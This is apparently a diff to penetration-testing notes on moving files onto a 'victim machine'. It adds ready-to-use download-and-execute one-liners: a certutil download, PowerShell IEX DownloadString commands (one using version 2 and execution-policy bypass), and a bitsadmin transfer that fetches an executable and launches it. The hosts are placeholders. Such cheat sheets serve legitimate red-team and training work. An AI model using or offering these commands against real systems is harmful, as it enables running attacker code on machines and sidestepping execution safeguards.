@@ -10,3 +10,20 @@ In many engagements you will need to be able to copy files between the victim ma
 CertUtil can be used to download files from a web server using the following command:
 
 `certutil -urlcache -split -f "http://ip-addr:port/NameOfHostedFile" <output-file-name>`
+
+### Powershell
+
+Powershell can also be used to dowload and execute powershell scripts on a host:
+
+`powershell IEX(New-Object Net.WebClient).DownloadString('http://<IPAddress>:<Port>/PowershellScript.ps1')`
+
+Powershell Download and Execute script with execution bypass and Powershell Version 2:
+
+`powershell -Version 2 -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://<IPAddress>:<Port>/PowershellScript.ps1')`
+
+### BITS Admin
+
+`cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://<ip address>:<port>/FileToTransfer.exe C:\Path\ExeOutputName.exe & start acrev.exe"`
+
+
+## Linux
